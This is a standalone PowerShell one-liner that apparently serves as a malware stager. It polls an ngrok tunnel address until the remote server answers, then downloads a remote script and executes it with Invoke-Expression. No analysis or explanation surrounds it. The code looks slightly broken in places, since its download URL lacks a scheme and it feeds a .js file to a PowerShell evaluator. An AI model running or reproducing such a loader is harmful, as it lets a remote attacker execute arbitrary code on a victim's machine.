$link="0.tcp.ap.ngrok.io:15330" ; while ($true) { try { $response = Invoke-WebRequest -Uri http://$link -Method Get -ErrorAction Stop ; if ($response.StatusCode -eq 200) { Invoke-Expression(new-object system.net.webclient).downloadstring($link+'\remote41050.js')  ; break ; } elseif ($response.StatusCode -eq 502) {} else { ; break ;}} catch {Start-Sleep -Seconds 5}}
